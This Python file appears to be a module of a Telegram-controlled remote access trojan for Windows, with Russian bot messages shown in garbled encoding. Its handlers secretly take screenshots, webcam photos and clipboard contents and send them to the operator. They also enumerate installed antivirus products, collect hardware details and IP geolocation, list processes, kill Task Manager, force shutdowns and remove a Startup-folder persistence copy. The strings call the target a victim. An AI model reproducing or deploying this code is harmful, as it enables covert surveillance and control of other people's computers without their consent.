# ---- Imports ---- #
import os, re
from PIL import ImageGrab
from aiogram import types
import win32api
import platform
import psutil
import GPUtil
import time
import requests
import pyautogui as p
import cv2
import pyperclip
from win32com.client import GetObject
import sys
# ---- Imports ---- #

def Screen(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–∫—Ä–∏–Ω—à–æ—Ç')
    async def screen(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, '–ü–æ–Ω—è–ª —Ç–µ–±—è, —Å–µ–π—á–∞—Å –±—É–¥–µ—Ç —Å–∫—Ä–∏–Ω—à–æ—Ç üñºÔ∏è')
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\sreenshot.jpg')
            f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
            await bot.send_document(admin_id, f)
            try:
                os.remove(os.getcwd() + '\\sreenshot.jpg')
            except Exception as e:
                await bot.send_message(admin_id, e)



def Antiviruses(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ê–Ω—Ç–∏–≤–∏—Ä—É—Å—ã')
    async def antiviruses(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, '–ü–æ–Ω—è–ª —Ç–µ–±—è. C–µ–π—á–∞—Å —Å–∫–∏–Ω—É c–ø–∏—Å–æ–∫ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–æ–≤ –ü–ö ü§ñ')
            Antiviruses = {
                'C:\\Program Files\\Windows Defender': 'Windows Defender',
                'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
                'C:\\Program Files\\AVG\\Antivirus': 'AVG',
                'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
                'C:\\Program Files (x86)\\IObit\\Advanced sysCare': 'Advanced sysCare',
                'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
                'C:\\Program Files\\DrWeb': 'Dr.Web',
                'C:\\Program Files\\ESET\\ESET Security': 'ESET',
                'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
                'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
                'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32'
            }
            Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
            AntivirusesAll = '\n'.join(Antivirus)
            await bot.send_message(admin_id, "<code>"+ AntivirusesAll + "</code>", parse_mode='HTML')



def Pc_info(dp, bot, admin_id):
    @dp.message_handler(text_contains='–î–∞–Ω–Ω—ã–µ –ü–ö')
    async def pc_info(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, '–©–∞—Å –¥–æ—Å—Ç–∞–Ω–µ–º –≤—Å–µ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –∫–æ–º–ø—É–∫—Ç–µ—Ä–∞ üñ•Ô∏è')
            try:
                def get_size(bytes, suffix="B"):
                    factor = 1024
                    for unit in ["", "K", "M", "G", "T", "P"]:
                        if bytes < factor:
                            return f"{bytes:.2f}{unit}{suffix}"
                        bytes /= factor
                uname = platform.uname()

                namepc = "\n–ò–º—è –ø–∫: " + str(uname.node)
                countofcpu = psutil.cpu_count(logical=True)
                allcpucount = "\n–û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —è–¥–µ—Ä –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞:" + str(countofcpu) 

                cpufreq = psutil.cpu_freq()
                cpufreqincy = "\n–ß–∞—Å—Ç–æ—Ç–∞ –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–∞: " + str(cpufreq.max) + 'Mhz'


                svmem = psutil.virtual_memory()
                allram = "\n–û–±—â–∞—è –ø–∞–º—è—Ç—å –û–ó–£: " + str(get_size(svmem.total))
                ramfree = "\n–î–æ—Å—Ç—É–ø–Ω–æ: " + str(get_size(svmem.available))
                ramuseg = "\n–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è: " + str(get_size(svmem.used))

                partitions = psutil.disk_partitions()
                for partition in partitions:
                    nameofdevice = "\n–î–∏—Å–∫: " + str(partition.device)
                    nameofdick = "\n–ò–º—è –¥–∏—Å–∫–∞: " + str(partition.mountpoint)
                    typeoffilesystem = "\n–¢–∏–ø —Ñ–∞–π–ª–æ–≤–æ–π —Å–∏—Å—Ç–µ–º—ã: " + str(partition.fstype)
                    try:
                        partition_usage = psutil.disk_usage(partition.mountpoint)
                    except PermissionError:

                        continue
                    allstorage = "\n–û–±—â–∞—è –ø–∞–º—è—Ç—å: " + str(get_size(partition_usage.total))
                    usedstorage = "\n–ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è: " + str(get_size(partition_usage.used))
                    freestorage = "\n–°–≤–æ–±–æ–¥–Ω–æ: " + str(get_size(partition_usage.free))



                try:
                    gpus = GPUtil.getGPUs()
                    list_gpus = []
                    for gpu in gpus:

                        gpu_name = "\n–ú–æ–¥–µ–ª—å –≤–∏–¥–µ–æ–∫–∞—Ä—Ç—ã: " + gpu.name

                        gpu_free_memory = "\n–°–≤–æ–±–æ–¥–Ω–æ –ø–∞–º—è—Ç–∏ –≤ –≤–∏–¥–µ–æ–∫–∞—Ä—Ç–µ: " + f"{gpu.memoryFree}MB"

                        gpu_total_memory = "\n–û–±—â–∞—è –ø–∞–º—è—Ç—å –≤–∏–¥–µ–æ–∫–∞—Ä—Ç—ã: " f"{gpu.memoryTotal}MB"

                        gpu_temperature = "\n–¢–µ–º–ø–µ—Ä–∞—Ç—É—Ä–∞ –≤–∏–¥–µ–æ–∫–∞—Ä—Ç—ã –≤ –¥–∞–Ω–Ω—ã–π –º–æ–º–µ–Ω—Ç: " f"{gpu.temperature} ¬∞C"
                except:
                    await bot.send_message(admin_id, '\n–í–∏–¥–µ–æ–∫–∞—Ä—Ç—ã –Ω–µ—Ç—É –ª–∏–±–æ –æ–Ω–∞ –≤—Å—Ç—Ä–æ–µ–Ω–Ω–∞—è')

                headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                }
                drives = str(win32api.GetLogicalDriveStrings())
                drives = str(drives.split('\000')[:-1])

                try:
                    ip = requests.get('https://api.ipify.org').text
                    urlloc = 'http://ip-api.com/json/'+ip
                    location1 = requests.get(urlloc, headers=headers).text
                except Exception as e:
                    location1 = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
                    print(e)
                all_data = "–í—Ä–µ–º—è: " + time.asctime() + '\n' + '\n' + "–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä: " + platform.processor() + '\n' + "–°–∏—Å—Ç–µ–º–∞: " + platform.system() + ' ' + platform.release() + '\n–î–∞–Ω–Ω—ã–µ –ª–æ–∫–∞—Ü–∏–∏ –∏ IP:' + location1 + '\n–î–∏—Å–∫–∏:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
                await bot.send_message(admin_id, "<i>" + all_data + "</i>", parse_mode='HTML')
            except Exception as e:
                await bot.send_message(admin_id, e)



def VolumeON(dp, bot, admin_id):
    @dp.message_handler(text_contains='–í–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫ –Ω–∞ 100%')
    async def volumeON(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, '–£–Ω–æ –º–æ–º–µ–Ω—Ç–æ, —â–∞—Å –±—É–¥–µ—Ç –∑–≤—É–∫ –Ω–∞ –º–∞–∫—Å üîä')
            for x in range(1,100):
                p.hotkey('volumeup')
            await bot.edit_message_text('–ó–≤—É–∫ —É—Å–ø–µ—à–Ω–æ –±—ã–ª –≤–∫–ª—é—á–µ–Ω –Ω–∞ 100% ‚úÖ', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def VolumeOFF(dp, bot, admin_id):
    @dp.message_handler(text_contains='–í—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫')
    async def volumeOFF(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, '–£–Ω–æ –º–æ–º–µ–Ω—Ç–æ, —â–∞—Å –≤—ã–∫–ª—é—á–µ–º –∑–≤—É–∫ üîà')
            p.hotkey('volumemute')
            await bot.edit_message_text('–ó–≤—É–∫ —É—Å–ø–µ—à–Ω–æ –±—ã–ª –≤—ã–ª—é—á–µ–Ω ‚úÖ', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def Shutdown(dp, bot, admin_id):
    @dp.message_handler(text_contains='–í—ã–∫–ª—é—á–∏—Ç—å –ü–ö')
    async def shutdown(message: types.Message):
        try:
            await bot.send_message(admin_id, '–í—ã–∫–ª—é—á–∞—é –ø–∫...üí§')
            os.system('shutdown /s /t 0')
        except Exception as e:
            await bot.send_message(admin_id, e)



def Restart(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö')
    async def restart(message: types.Message):
        try:
            await bot.send_message(admin_id, '–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞—é –ø–∫...üîÉ')
            os.system('shutdown /r /t 0')
        except Exception as e:
            await bot.send_message(admin_id, e)



def F4(dp, bot, admin_id):
    @dp.message_handler(text_contains='ALT + F4')
    async def f4(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, '–©–∞—Å –∑–∞–∫—Ä–æ–µ–º –æ–∫–Ω–æ üåö')
            p.hotkey('alt','f4')
            await bot.edit_message_text('–û–∫–Ω–æ –±—ã–ª–æ —É—Å–ø–µ—à–Ω–æ –∑–∞–∫—Ä—ã—Ç–æ ‚úÖ', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def WinD(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–≤–µ—Ä–Ω—É—Ç—å –≤—Å–µ –æ–∫–Ω–∞')
    async def wind(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, '–©–∞—Å —Å–≤–µ—Ä–Ω—ë–º –æ–∫–Ω–æ üåö')
            p.hotkey('win','d')
            await bot.edit_message_text('–û–∫–Ω–æ –±—ã–ª–æ —É—Å–ø–µ—à–Ω–æ —Å–≤—ë—Ä–Ω—É—Ç–æ ‚úÖ', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def VolumeOFF(dp, bot, admin_id):
    @dp.message_handler(text_contains='–í—ã–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫')
    async def volumeOFF(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, '–£–Ω–æ –º–æ–º–µ–Ω—Ç–æ, —â–∞—Å –≤—ã–∫–ª—é—á–µ–º –∑–≤—É–∫ üîà')
            p.hotkey('volumemute')
            await bot.edit_message_text('–ó–≤—É–∫ —É—Å–ø–µ—à–Ω–æ –±—ã–ª –≤—ã–ª—é—á–µ–Ω ‚úÖ', admin_id, msg.message_id)
        except Exception as e:
            await bot.send_message(admin_id, e)



def GetDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è')
    async def getdir(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, '–£–Ω–æ –º–æ–º–µ–Ω—Ç–æ, —â–∞—Å –ø–æ–ª—É—á–∏–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é –≤ –∫–æ—Ç–æ—Ä–æ–π –Ω–∞—Ö–æ–¥–∏–º—Å—è...')
            dr = os.getcwd()
            await bot.edit_message_text("–¢–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç—Ä–∏—è, –≤ –∫–æ—Ç–æ—Ä–æ–π –Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è RAT: " + "\n<code>" + dr + "</code>", admin_id, msg.message_id, parse_mode='HTML')
        except Exception as e:
            await bot.send_message(admin_id, e)


def ListDir(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏')
    async def listdir(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, '–£–Ω–æ –º–æ–º–µ–Ω—Ç–æ, —â–∞—Å –ø–æ–ª—É—á–∏–º —Å–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –≤ –∫–æ—Ç–æ—Ä–æ–π –Ω–∞—Ö–æ–¥–∏–º—Å—è...')
            ls = os.listdir()
            info = '<code>' + '\n'.join([str(elem) for elem in ls]) + "</code>"

            if len(info) > 4096:
                for x in range(0, len(info), 4096):
                    await bot.send_message(admin_id, info[x:x+4096], parse_mode='HTML')
            else:
                await bot.send_message(admin_id, info, parse_mode='HTML')
        except Exception as e:
            await bot.send_message(admin_id, e)



def Selfie(dp, bot, admin_id):
    @dp.message_handler(text_contains='–§–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã')
    async def selfie(message: types.Message):
        try:
            msg = await bot.send_message(admin_id, '–°–∫–∞–∂–∏—Ç–µ —Å—Å—Å—ã—Ä, –¥–µ–ª–∞–µ–º —Å–µ–ª—Ñ–∏ü§≥')
            cap = cv2.VideoCapture(0)
            dr = os.getcwd()
            for i in range(30):
                cap.read()
            ret, frame = cap.read()
            cv2.imwrite(dr + '\\4543t353454.png', frame)   
            cap.release()
            webcam = open(dr + '\\4543t353454.png','rb')
            await bot.send_document(admin_id, webcam)
            os.remove(dr + '\\4543t353454.png')
        except Exception as e:
            await bot.send_message(admin_id, e)


def Screamer(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–∫—Ä–∏–º–µ—Ä')
    async def screamer(message: types.Message):
        msg = await bot.send_message(admin_id, '–°–µ–π—á–∞—Å –±—É–¥–µ—Ç —Å—Ç—Ä–∞—à–Ω–æ...üôáüèª‚Äç‚ôÇÔ∏è')
        try:
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")
        file = os.path.join(base_path, 'videoplayback.mp4')
        os.system(file)
        time.sleep(10)
        await bot.edit_message_text("–û–Ω –æ–±–∫–æ–Ω—á–∞–ª—Å—è, —è —Å–∞–º –≤–∏–¥–µ–ª ü´†", admin_id, msg.message_id)



def SeeEx(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞')
    async def seex(message: types.Message):
        if message.from_user.id == admin_id:
            msg = await bot.send_message(admin_id, '–£–Ω–æ –º–æ–º–µ–Ω—Ç–æ...')
            Buffer = pyperclip.paste()
            await bot.edit_message_text(f'–ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞:\n<code>{Buffer}</code>', admin_id, msg.message_id, parse_mode='HTML')

def ProcList(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤')
    async def proclist(message: types.Message):
        if message.from_user.id == admin_id:
            msg = await bot.send_message(admin_id, '–£–Ω–æ –º–æ–º–µ–Ω—Ç–æ...')
            result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
            await bot.edit_message_text(f'–í–µ—Å—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤:\n<code>{result}</code>', admin_id, msg.message_id, parse_mode='HTML')



def CloseTask(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ó–∞–∫—Ä—ã—Ç—å –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á')
    async def closetask(message: types.Message):
        if message.from_user.id == admin_id:
            a = os.system(f'taskkill /im Taskmgr.exe')
            if a == 128:
                await bot.send_message(admin_id, '–¢–∞–∫–æ–π –ø—Ä–æ—Ü–µ—Å—Å –Ω–µ –∑–∞–ø—É—â–µ–Ω')
            elif a == 0:
                await bot.send_message(admin_id, '–ü—Ä–æ—Ü–µ—Å—Å —É—Å–ø–µ—à–Ω–æ –±—ã–ª –∑–∞–∫—Ä—ã—Ç')
            elif a == 1:
                await bot.send_message(admin_id, '–ñ–µ—Ä—Ç–≤–∞ –Ω–µ –∑–∞–ø—É—Å—Ç–∏–ª–∞ –ø—Ä–æ–≥—Ä–∞–º–º—É –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞')




def Uninstall(dp, bot, admin_id):
    @dp.message_handler(text_contains='–°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ')
    async def uninstall(message: types.Message):
        if message.from_user.id == admin_id:
            await bot.send_message(admin_id, '–ü–æ–∫–∞ üò¢, —è –ø–µ—Ä–µ—Å—Ç–∞–Ω—É —Å–≤–æ—é —Ä–∞–±–æ—Ç—É, –ø–æ—Å–ª–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∏.\n–õ–∞–π—Ñ—Ö–∞–∫: —Ç—ã —Å–∞–º –º–æ–∂–µ—à—å –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–∫ :)')
            Thisfile = sys.argv[0]
            os.system(f'ping 127.0.0.1 -n 3 > nul && del /f "{os.path.expanduser("~")}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{os.path.basename(Thisfile)}"')



def DVDOpen(dp, bot, admin_id):
    @dp.message_handler(text_contains='–û—Ç–∫—Ä—ã—Ç—å DVD')
    async def dvdopen(message: types.Message):
        if message.from_user.id == admin_id:
            try:
                ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door open', None, 0, None)
                await bot.send_message(admin_id, '–£—Å–ø–µ—à–Ω–æ ‚úÖ')
            except:
                await bot.send_message(admin_id, '–£ –∂–µ—Ä—Ç–≤—ã –Ω–µ—Ç—É DVD')


def DVDClose(dp, bot, admin_id):
    @dp.message_handler(text_contains='–ó–∞–∫—Ä—ã—Ç—å DVD')
    async def dvdclose(message: types.Message):
        if message.from_user.id == admin_id:
            try:
                ctypes.windll.WINMM.mciSendStringW(u'set cdaudio door closed', None, 0, None)
                await bot.send_message(admin_id, '–£—Å–ø–µ—à–Ω–æ ‚úÖ')
            except:
                await bot.send_message(admin_id, '–£ –∂–µ—Ä—Ç–≤—ã –Ω–µ—Ç—É DVD')